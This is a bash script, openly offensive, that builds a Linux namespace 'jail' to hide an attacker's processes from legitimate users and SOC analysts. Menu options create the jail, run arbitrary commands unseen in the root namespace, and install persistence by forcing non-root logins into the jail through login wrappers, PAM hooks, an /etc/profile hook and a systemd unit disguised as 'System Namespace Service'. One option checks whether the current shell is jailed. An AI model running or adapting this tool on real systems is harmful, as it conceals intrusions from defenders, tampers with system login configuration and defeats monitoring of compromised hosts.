#!/bin/bash
#
# Namespace Jail — "Blue Pill" at the Linux Namespace Level
#
# This technique creates a containerized environment using Linux namespaces
# (PID, mount, net, UTS) that mirrors the real system. Legitimate users and
# their sessions are trapped inside the jail. From within the namespace,
# everything looks normal — ps, top, mount, hostname all show expected data.
# But the attacker's processes run in the REAL root namespace, completely
# invisible to anyone inside the jail.
#
# SOC analysts inside the jail cannot detect they are containerized because:
# - /proc is re-mounted inside the namespace (shows only jailed PIDs)
# - The filesystem is bind-mounted (looks identical to the real one)
# - Network stack is shared or bridged (connectivity works normally)
# - hostname/UTS can be cloned to match the original
#
# Concept:
#   Real Host (root namespace) — attacker's processes, C2, rootkit
#     └── Namespace Jail (child namespace) — users, SOC tools, services
#

if [[ $(id -u) -ne 0 ]]; then
    echo "[ERROR] You must run this script as root" >&2
    exit 1
fi

echo " [*] Namespace Jail — Container-Based Process Isolation [*] "
echo ""
echo "This creates a namespace jail that mirrors the real system."
echo "Users inside the jail cannot see the attacker's processes."
echo ""

echo "Select mode:"
echo "  [1] Create namespace jail (trap future logins)"
echo "  [2] Enter the jail manually (for testing)"
echo "  [3] Launch a process OUTSIDE the jail (in root namespace)"
echo "  [4] Check if you are inside a namespace jail"
echo "  [5] Setup persistent jail (via PAM + nsenter on login)"
echo "  [6] Remove/cleanup namespace jail"
read -p "Choice [1-6]: " mode

JAIL_ROOT="/var/tmp/.ns_jail"
JAIL_PID_FILE="/var/tmp/.ns_jail_pid"
JAIL_INIT="/var/tmp/.ns_jail_init"

case "$mode" in
    1)
        echo ""
        echo "[*] Creating namespace jail..."
        echo ""

        # Check for required tools
        for tool in unshare nsenter mount; do
            if ! command -v "$tool" &>/dev/null; then
                echo "[ERROR] Required tool '$tool' not found." >&2
                exit 1
            fi
        done

        # Create the jail init script that will be PID 1 inside the namespace
        cat > "$JAIL_INIT" <<'INITEOF'
#!/bin/bash
# Jail init — runs as PID 1 inside the namespace

# Remount /proc so it shows only processes in THIS namespace
mount -t proc proc /proc 2>/dev/null

# Remount /sys for consistency
mount -t sysfs sysfs /sys 2>/dev/null

# Remount /dev/pts for terminal support
mount -t devpts devpts /dev/pts 2>/dev/null

# Keep running as PID 1 — if this exits, the namespace dies
exec sleep infinity
INITEOF
        chmod +x "$JAIL_INIT"

        # Create the namespace with PID + mount isolation
        # --fork: fork before exec (required for PID namespace)
        # --pid: new PID namespace (processes inside can't see outside PIDs)
        # --mount: new mount namespace (mount changes don't leak out)
        # --mount-proc: automatically remount /proc for the new PID namespace
        echo "[+] Launching jail namespace (PID + Mount isolation)..."

        unshare --fork --pid --mount --mount-proc \
            bash -c "$JAIL_INIT" &
        JAIL_PID=$!

        sleep 1

        # Verify the namespace is running
        if kill -0 "$JAIL_PID" 2>/dev/null; then
            echo "$JAIL_PID" > "$JAIL_PID_FILE"
            echo ""
            echo "[*] Namespace jail created successfully!"
            echo "    Jail init PID (in root namespace): $JAIL_PID"
            echo "    PID file: $JAIL_PID_FILE"
            echo ""
            echo "[*] To enter the jail:  nsenter --target $JAIL_PID --pid --mount -- /bin/bash"
            echo "[*] To trap logins:     Use option [5] to set up PAM integration"
            echo "[*] Your processes in the root namespace are INVISIBLE inside the jail."
        else
            echo "[ERROR] Failed to create namespace jail" >&2
            exit 1
        fi
        ;;

    2)
        echo ""
        if [ ! -f "$JAIL_PID_FILE" ]; then
            echo "[ERROR] No jail found. Create one first with option [1]." >&2
            exit 1
        fi

        JAIL_PID=$(cat "$JAIL_PID_FILE")

        if ! kill -0 "$JAIL_PID" 2>/dev/null; then
            echo "[ERROR] Jail process $JAIL_PID is not running." >&2
            rm -f "$JAIL_PID_FILE"
            exit 1
        fi

        echo "[*] Entering namespace jail (PID $JAIL_PID)..."
        echo "[*] You are now INSIDE the jail. Type 'exit' to leave."
        echo ""

        nsenter --target "$JAIL_PID" --pid --mount -- /bin/bash
        echo ""
        echo "[*] Exited the namespace jail. You are back in the root namespace."
        ;;

    3)
        echo ""
        echo "[*] You are currently in the ROOT namespace."
        echo "[*] Any process you launch here is invisible to jail inmates."
        echo ""
        read -p "Enter command to run in root namespace: " cmd
        echo "[+] Running: $cmd"
        eval "$cmd"
        ;;

    4)
        echo ""
        echo "[*] Namespace Detection Check"
        echo ""

        # Method 1: Compare PID namespace inode with init (PID 1)
        MY_PIDNS=$(readlink /proc/self/ns/pid 2>/dev/null)
        INIT_PIDNS=$(readlink /proc/1/ns/pid 2>/dev/null)

        echo "    Your PID namespace:    $MY_PIDNS"
        echo "    Init (PID 1) namespace: $INIT_PIDNS"

        if [ "$MY_PIDNS" != "$INIT_PIDNS" ]; then
            echo ""
            echo "    [!] WARNING: You are inside a PID namespace jail!"
            echo "    [!] Your PID namespace differs from the host init."
        else
            echo ""
            echo "    [OK] You appear to be in the root PID namespace."
        fi

        # Method 2: Check mount namespace
        MY_MNTNS=$(readlink /proc/self/ns/mnt 2>/dev/null)
        INIT_MNTNS=$(readlink /proc/1/ns/mnt 2>/dev/null)

        echo ""
        echo "    Your mount namespace:    $MY_MNTNS"
        echo "    Init (PID 1) mount ns:   $INIT_MNTNS"

        if [ "$MY_MNTNS" != "$INIT_MNTNS" ]; then
            echo "    [!] WARNING: You are in an isolated mount namespace!"
        fi

        # Method 3: Check if PID 1 is the real systemd/init
        PID1_CMD=$(cat /proc/1/comm 2>/dev/null)
        echo ""
        echo "    PID 1 process: $PID1_CMD"

        if [ "$PID1_CMD" == "sleep" ] || [ "$PID1_CMD" == "bash" ]; then
            echo "    [!] WARNING: PID 1 is '$PID1_CMD' — likely a namespace jail!"
        fi

        # Method 4: Check /proc/1/cgroup for container indicators
        if grep -qE 'docker|lxc|kubepod|containerd' /proc/1/cgroup 2>/dev/null; then
            echo "    [!] WARNING: Container indicators found in /proc/1/cgroup"
        fi
        echo ""
        ;;

    5)
        echo ""
        echo "[*] Setting up persistent namespace jail via PAM"
        echo ""
        echo "This will modify PAM login to automatically push new sessions"
        echo "into the namespace jail. The attacker keeps a root namespace shell."
        echo ""

        if [ ! -f "$JAIL_PID_FILE" ]; then
            echo "[ERROR] No jail found. Create one first with option [1]." >&2
            exit 1
        fi

        JAIL_PID=$(cat "$JAIL_PID_FILE")

        if ! kill -0 "$JAIL_PID" 2>/dev/null; then
            echo "[ERROR] Jail process $JAIL_PID is not running." >&2
            exit 1
        fi

        # Create a wrapper script that enters the namespace
        WRAPPER="/usr/local/sbin/ns-jail-login"
        cat > "$WRAPPER" <<WRAPEOF
#!/bin/bash
# Auto-enter namespace jail on login
JAIL_PID_FILE="$JAIL_PID_FILE"
if [ -f "\$JAIL_PID_FILE" ]; then
    JP=\$(cat "\$JAIL_PID_FILE")
    if kill -0 "\$JP" 2>/dev/null; then
        exec nsenter --target "\$JP" --pid --mount -- /bin/bash -l
    fi
fi
# Fallback to normal shell if jail is not running
exec /bin/bash -l
WRAPEOF
        chmod +x "$WRAPPER"

        # Method A: Modify /etc/shells and set as default shell for users
        echo "[+] Created login wrapper: $WRAPPER"
        echo ""
        echo "To trap specific users, change their shell:"
        echo "  chsh -s $WRAPPER <username>"
        echo ""

        # Method B: Create a PAM session script
        PAM_SCRIPT="/usr/local/sbin/ns-jail-pam"
        cat > "$PAM_SCRIPT" <<PAMEOF
#!/bin/bash
# PAM session hook to enter namespace jail
JAIL_PID_FILE="$JAIL_PID_FILE"
if [ -f "\$JAIL_PID_FILE" ]; then
    JP=\$(cat "\$JAIL_PID_FILE")
    if kill -0 "\$JP" 2>/dev/null; then
        # Only jail non-root users (attacker keeps root shell access)
        if [ "\$(id -u)" -ne 0 ]; then
            exec nsenter --target "\$JP" --pid --mount -- "\$PAM_USER_SHELL"
        fi
    fi
fi
PAMEOF
        chmod +x "$PAM_SCRIPT"

        echo "[+] Created PAM session script: $PAM_SCRIPT"
        echo ""

        # Method C: Add to /etc/profile (affects all interactive bash logins)
        PROFILE_HOOK="# ns-jail-hook
if [ -f $JAIL_PID_FILE ] && [ \"\$(id -u)\" -ne 0 ]; then
    JP=\$(cat $JAIL_PID_FILE)
    if kill -0 \"\$JP\" 2>/dev/null; then
        MY_NS=\$(readlink /proc/self/ns/pid 2>/dev/null)
        JAIL_NS=\$(readlink /proc/\$JP/ns/pid 2>/dev/null)
        if [ \"\$MY_NS\" != \"\$JAIL_NS\" ]; then
            exec nsenter --target \"\$JP\" --pid --mount -- /bin/bash -l
        fi
    fi
fi
# end-ns-jail-hook"

        read -p "Add auto-jail hook to /etc/profile? (y/n): " add_profile
        if [[ "$add_profile" == "y" || "$add_profile" == "Y" ]]; then
            if ! grep -qF "ns-jail-hook" /etc/profile 2>/dev/null; then
                echo "" >> /etc/profile
                echo "$PROFILE_HOOK" >> /etc/profile
                echo "[+] Hook added to /etc/profile"
                echo "    All non-root interactive logins will be jailed."
            else
                echo "[*] Hook already exists in /etc/profile"
            fi
        fi

        # Create a systemd service to start the jail on boot
        read -p "Create systemd service for boot persistence? (y/n): " boot_persist
        if [[ "$boot_persist" == "y" || "$boot_persist" == "Y" ]]; then
            cat > /etc/systemd/system/ns-jail.service <<SVCEOF
[Unit]
Description=System Namespace Service
After=multi-user.target

[Service]
Type=forking
ExecStart=/bin/bash -c 'unshare --fork --pid --mount --mount-proc bash -c "$JAIL_INIT" & echo \$! > $JAIL_PID_FILE'
ExecStop=/bin/bash -c 'kill \$(cat $JAIL_PID_FILE) 2>/dev/null; rm -f $JAIL_PID_FILE'
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
SVCEOF
            systemctl daemon-reload 2>/dev/null
            systemctl enable ns-jail.service 2>/dev/null
            echo "[+] Systemd service created and enabled: ns-jail.service"
        fi

        echo ""
        echo "[*] Persistent namespace jail setup complete!"
        echo "    Attacker: stays in root namespace (full visibility)"
        echo "    Users:    auto-jailed on login (isolated view)"
        ;;

    6)
        echo ""
        echo "[*] Cleaning up namespace jail..."

        # Kill the jail init process
        if [ -f "$JAIL_PID_FILE" ]; then
            JAIL_PID=$(cat "$JAIL_PID_FILE")
            if kill -0 "$JAIL_PID" 2>/dev/null; then
                kill -9 "$JAIL_PID" 2>/dev/null
                echo "[+] Killed jail init process (PID $JAIL_PID)"
            fi
            rm -f "$JAIL_PID_FILE"
        fi

        # Remove login wrapper
        rm -f /usr/local/sbin/ns-jail-login 2>/dev/null
        rm -f /usr/local/sbin/ns-jail-pam 2>/dev/null
        rm -f "$JAIL_INIT" 2>/dev/null

        # Remove /etc/profile hook
        if grep -qF "ns-jail-hook" /etc/profile 2>/dev/null; then
            sed -i '/# ns-jail-hook/,/# end-ns-jail-hook/d' /etc/profile
            echo "[+] Removed hook from /etc/profile"
        fi

        # Remove systemd service
        if [ -f /etc/systemd/system/ns-jail.service ]; then
            systemctl disable ns-jail.service 2>/dev/null
            rm -f /etc/systemd/system/ns-jail.service
            systemctl daemon-reload 2>/dev/null
            echo "[+] Removed systemd service"
        fi

        echo "[*] Namespace jail cleanup complete."
        ;;

    *)
        echo "[ERROR] Invalid choice" >&2
        exit 1
        ;;
esac

sleep 1
